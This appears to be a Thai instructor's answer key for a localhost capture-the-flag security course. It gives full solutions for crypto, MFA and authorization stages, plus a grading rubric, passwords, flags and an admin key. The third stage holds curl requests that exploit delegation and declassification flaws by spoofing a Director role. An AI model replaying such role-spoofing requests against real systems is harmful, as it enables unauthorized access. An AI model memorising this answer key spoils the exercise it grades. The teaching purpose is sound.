# MUT Secure Vault - คู่มือผู้สอน (ฉบับง่าย)

**เอกสารลับ - สำหรับผู้สอนเท่านั้น**

---

## สรุปการปรับปรุง

| ด่าน | รายละเอียด |
|------|------------|
| **ด่าน 1** | Diffie-Hellman + Caesar Cipher (shift 17) + AES Decrypt + FLAG คำนวณเอง |
| **ด่าน 2** | 3 ปัจจัย (Email OTP, Password, PIN) พร้อมคำใบ้และช่องกรอก flag |
| **ด่าน 3** | 2 ช่องโหว่ (delegation, declassify) พร้อมคำแนะนำทีละขั้นตอน |

---

## ขั้นตอนเริ่มต้น (สำหรับทุกด่าน)

```bash
# 1. ลงทะเบียน
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"student1","email":"student1@test.com","password":"Test123!"}'

# 2. เข้าสู่ระบบ
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"student1","password":"Test123!"}'
# -> บันทึก token

# 3. เริ่มเกม (สำคัญ!)
curl -X POST http://localhost:3001/api/game/start \
  -H "Authorization: Bearer $TOKEN"
# -> ใช้ token ใหม่ที่ได้จากนี้ไปต่อ (มี sessionId)
```

---

## ด่าน 1: Cryptography - เฉลย

### ขั้นตอนที่ 1: ดาวน์โหลด Artifacts
```bash
curl http://localhost:3001/api/c1/artifacts \
  -H "Authorization: Bearer $TOKEN"
```

Response จะได้:
- `prime` (p): ค่า prime สำหรับ DH
- `generator` (g): ค่า generator สำหรับ DH
- `iv`: Initialization Vector สำหรับ AES
- `publicKey`: RSA public key สำหรับตรวจสอบลายเซ็น
- `saltCipher`: Caesar cipher (jlirerivv)

### ขั้นตอนที่ 2: Diffie-Hellman Key Exchange

```python
import requests
import random

# ค่าจาก artifacts
p = int(artifacts['diffieHellman']['prime'], 16)
g = int(artifacts['diffieHellman']['generator'], 16)

# สร้าง client private key (ตัวเลขสุ่ม)
a = random.getrandbits(256)

# คำนวณ client public key: A = g^a mod p
A = pow(g, a, p)

# ส่ง public key ไปยัง server
response = requests.post(
    'http://localhost:3001/api/c1/dh/exchange',
    headers={'Authorization': f'Bearer {TOKEN}'},
    json={'clientPublicKey': hex(A)[2:]}
)

# รับ server public key
B = int(response.json()['serverPublicKey'], 16)

# คำนวณ shared secret: S = B^a mod p
shared_secret = pow(B, a, p)
print(f"Shared Secret: {hex(shared_secret)}")
```

### ขั้นตอนที่ 3: ถอดรหัส Caesar Cipher เพื่อหา Salt

**คำตอบ:**
- Cipher text: `jlirerivv`
- Shift: **17** (เลื่อนกลับ 17 ตำแหน่ง)
- Plain text: `suranaree`

```python
def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result

cipher_text = "jlirerivv"
salt = caesar_decrypt(cipher_text, 17)  # = "suranaree"
```

### ขั้นตอนที่ 4: สร้าง AES Key จาก Shared Secret + Salt

```python
import hashlib

# Salt = "suranaree" (จาก Caesar cipher shift 17)
salt = "suranaree"
key_data = hex(shared_secret)[2:] + salt

# AES Key = SHA256(shared_secret_hex + "suranaree")[:32 bytes]
aes_key = hashlib.sha256(key_data.encode()).digest()
print(f"AES Key: {aes_key.hex()}")
```

### ขั้นตอนที่ 5: ถอดรหัส AES-256-CBC

```python
from Crypto.Cipher import AES

# รับข้อมูลที่เข้ารหัส
encrypted_response = requests.get(
    'http://localhost:3001/api/c1/encrypted',
    headers={'Authorization': f'Bearer {TOKEN}'}
).json()

iv = bytes.fromhex(artifacts['aes']['iv'])
encrypted_data = bytes.fromhex(encrypted_response['encrypted']['data'])

# ถอดรหัส AES-256-CBC
cipher = AES.new(aes_key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted_data)

# ลบ PKCS7 padding
padding_len = decrypted[-1]
message = decrypted[:-padding_len].decode('utf-8')
print(f"Decrypted Message: {message}")
```

**ข้อความที่ถอดรหัสได้:** `THE LEGACY OF SURANAREE LIVES ON...`

### ขั้นตอนที่ 6: ดึง Signature

```python
# รับลายเซ็น
sig_response = requests.get(
    'http://localhost:3001/api/c1/signature',
    headers={'Authorization': f'Bearer {TOKEN}'}
).json()

signature = sig_response['signature']['data']
```

> **Hint:** "Happy Birthday SUT" - วันเกิด มทส. คืออะไร?

### ขั้นตอนที่ 7: สร้าง FLAG_1

**สูตร:** `FLAG_1 = MUT{SHA256(message + "27072533" + signature)[:32]}`

> **หมายเหตุ:** 27072533 = วันที่ 27 กรกฎาคม 2533 (วันก่อตั้ง มทส. ในปี พ.ศ.)

```python
import hashlib

# FLAG_1 = MUT{SHA256(message + "27072533" + signature_hex)[:32]}
signature_hex = sig_response['signature']['data']
flag_data = message + "27072533" + signature_hex
flag_hash = hashlib.sha256(flag_data.encode()).hexdigest()[:32]
FLAG_1 = f"MUT{{{flag_hash}}}"
print(f"FLAG_1: {FLAG_1}")
```

### ส่ง FLAG_1
```bash
curl -X POST http://localhost:3001/api/c1/submit-flag \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{calculated_hash_here}"}'
```

### โค้ดเต็ม (Python)

```python
import requests
import random
import hashlib
from Crypto.Cipher import AES

BASE_URL = "http://localhost:3001/api"
TOKEN = "your_session_token"
headers = {"Authorization": f"Bearer {TOKEN}"}

def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result

# Step 1: Get artifacts
artifacts = requests.get(f"{BASE_URL}/c1/artifacts", headers=headers).json()['artifacts']
p = int(artifacts['diffieHellman']['prime'], 16)
g = int(artifacts['diffieHellman']['generator'], 16)
iv = bytes.fromhex(artifacts['aes']['iv'])

# Step 2: DH Exchange
a = random.getrandbits(256)
A = pow(g, a, p)

exchange = requests.post(
    f"{BASE_URL}/c1/dh/exchange",
    headers=headers,
    json={"clientPublicKey": hex(A)[2:]}
).json()

B = int(exchange['serverPublicKey'], 16)
shared_secret = pow(B, a, p)

# Step 3: Solve Caesar cipher (shift 17)
cipher_text = "jlirerivv"
salt = caesar_decrypt(cipher_text, 17)  # = "suranaree"

# Step 4: Derive AES key
key_data = hex(shared_secret)[2:] + salt
aes_key = hashlib.sha256(key_data.encode()).digest()

# Step 5: Decrypt message
encrypted = requests.get(f"{BASE_URL}/c1/encrypted", headers=headers).json()
cipher = AES.new(aes_key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(bytes.fromhex(encrypted['encrypted']['data']))
message = decrypted[:-decrypted[-1]].decode()
print(f"Message: {message}")

# Step 6: Get signature
sig_resp = requests.get(f"{BASE_URL}/c1/signature", headers=headers).json()
signature = sig_resp['signature']['data']

# Step 7: Generate FLAG_1
flag_data = message + "27072533" + signature
flag_hash = hashlib.sha256(flag_data.encode()).hexdigest()[:32]
FLAG_1 = f"MUT{{{flag_hash}}}"
print(f"FLAG_1: {FLAG_1}")

# Step 8: Submit
result = requests.post(
    f"{BASE_URL}/c1/submit-flag",
    headers=headers,
    json={"flag": FLAG_1}
).json()
print(result)
```

### ความรู้ที่ได้จากด่านนี้
- **Diffie-Hellman**: การแลกเปลี่ยนคีย์อย่างปลอดภัยผ่านช่องทางที่ไม่ปลอดภัย
- **Caesar Cipher**: การเข้ารหัสแบบดั้งเดิมด้วยการเลื่อนตัวอักษร
- **AES-256-CBC**: การเข้ารหัสแบบสมมาตรที่ใช้กันแพร่หลาย
- **RSA Digital Signature**: การยืนยันความถูกต้องของข้อมูล
- **SHA-256**: ฟังก์ชัน hash ที่ใช้สร้าง key และ flag

---

## ด่าน 2: Authentication - เฉลย

### คำตอบ (3 ปัจจัย)
| ปัจจัย | คำตอบ | ที่มา |
|--------|--------|--------|
| Email OTP | กรอกอีเมลจริง → ได้ OTP + คำใบ้ทางอีเมล | การยืนยันตัวตนผ่านอีเมล |
| รหัสผ่าน | `computer_engineering_#28!` | ใบ้แบบสลับตัวอักษรในอีเมล |
| PIN | `30000` | รหัสไปรษณีย์บนซองจดหมาย (มทส. นครราชสีมา) |

### วิธีทำ
```bash
# 1. ส่ง Email OTP
curl -X POST http://localhost:3001/api/c2/email/send-otp \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "test@test.com"}'
# -> จะได้ demoOTP ในการตอบกลับ (เช่น "123456")

# 2. ยืนยัน OTP
curl -X POST http://localhost:3001/api/c2/email/verify-otp \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"otp": "123456"}'  # ใช้ค่า demoOTP ที่ได้

# 3. ยืนยันรหัสผ่าน (ดูคำใบ้แบบสลับตัวอักษรในอีเมล)
curl -X POST http://localhost:3001/api/c2/password \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "computer_engineering_#28!"}'

# 4. ยืนยัน PIN
curl -X POST http://localhost:3001/api/c2/pin \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"pin": "30000"}'

# 5. รับ FLAG_2
curl http://localhost:3001/api/c2/mfa/status \
  -H "Authorization: Bearer $SESSION_TOKEN"

# 6. ส่ง FLAG_2 (หรือใช้ช่องกรอกใน UI)
curl -X POST http://localhost:3001/api/c2/submit-flag \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{...}"}'
```

---

## ด่าน 3: Authorization - เฉลย

### 2 ช่องโหว่ที่ใช้

| ช่องโหว่ | Endpoint | ผลลัพธ์ |
|----------|----------|---------|
| Delegation | POST /api/c3/request-access | เลื่อนตำแหน่ง Student → Researcher |
| Declassification | POST /api/c3/declassify | เข้าถึงไฟล์ Top Secret |

### วิธีทำ
```bash
# 1. อัพเกรดบทบาท
curl -X POST http://localhost:3001/api/c3/request-access \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"resource": "any", "reason": "any"}'

# 2. เข้าถึงไฟล์ลับที่สุด
curl -X POST http://localhost:3001/api/c3/declassify \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"resource": "FINAL_FLAG.txt", "requester_role": "Director", "reason": "any"}'

# 3. รับ FINAL_FLAG
curl http://localhost:3001/api/c3/final-flag \
  -H "Authorization: Bearer $TOKEN"

# 4. ส่ง flag
curl -X POST http://localhost:3001/api/c3/submit-flag \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag": "MUT{...}"}'
```

---

## เกณฑ์การให้คะแนน

### ด่าน 1 (35 คะแนน)
- ทำ Diffie-Hellman Exchange: 10 คะแนน
- ถอดรหัส Caesar Cipher: 5 คะแนน
- ถอดรหัส AES: 10 คะแนน
- สร้าง FLAG_1 ถูกต้อง: 5 คะแนน
- อธิบายหลักการ: 5 คะแนน

### ด่าน 2 (30 คะแนน)
- ยืนยัน OTP: 5 คะแนน
- ยืนยันรหัสผ่าน: 10 คะแนน
- ยืนยัน PIN: 10 คะแนน
- อธิบาย MFA: 5 คะแนน

### ด่าน 3 (35 คะแนน)
- ใช้ช่องโหว่ delegation: 15 คะแนน
- ใช้ช่องโหว่ declassification: 15 คะแนน
- อธิบายช่องโหว่: 5 คะแนน

---

## Admin Commands

```bash
# ดู sessions ทั้งหมด
curl http://localhost:3001/api/admin/sessions \
  -H "X-Admin-Key: MUT_ADMIN_1990"

# รีเซ็ต session
curl -X POST http://localhost:3001/api/admin/reset/1 \
  -H "X-Admin-Key: MUT_ADMIN_1990"

# ดู audit log
curl http://localhost:3001/api/admin/audit \
  -H "X-Admin-Key: MUT_ADMIN_1990"
```

---

## ข้อมูลสำคัญ

| ค่า | ความหมาย |
|-----|----------|
| 27072533 | วันก่อตั้ง มทส. (27 ก.ค. 2533) |
| 30000 | รหัสไปรษณีย์นครราชสีมา |
| computer_engineering_#28! | รหัสผ่านด่าน 2 (ใบ้แบบสลับตัวอักษร) |
| suranaree | Salt สำหรับ AES key (จาก Caesar cipher) |
| jlirerivv | Salt cipher (shift 17 → suranaree) |
| MUT_ADMIN_1990 | Admin key |
